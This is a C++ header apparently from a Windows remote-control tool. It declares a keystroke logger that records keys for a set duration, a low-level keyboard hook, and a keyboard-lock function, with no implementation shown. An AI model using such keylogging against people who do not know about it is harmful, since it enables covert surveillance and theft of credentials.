#ifndef _KEYBOARD_H_
#define _KEYBOARD_H_

#include <iostream>
#include <string>
#include <sstream>
#include <map>
#include <windows.h>
#include <chrono>
#include <thread>
#include "html_generator.h"

#define l "&#10216;" // Left bracket ⟨
#define r "&#10217;" // Right bracket ⟩

string getCurrentTime();

extern map<int, string> spec_key;

string parseKeyEvent(int key_code);

string keyLog(int duration);

Response getKeyLog(int duration);

// Global variables
extern HHOOK hKeyboardHook; // Keyboard hook handle
extern bool isKeyboardLocked; // Keyboard lock state
extern atomic<bool> isRunning; // Atomic flag for hook thread loop
extern DWORD hookThreadId; // ID of the hook thread

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

void hookThread();

Response keyLock(int duration);

#endif // !_KEYBOARD_H_
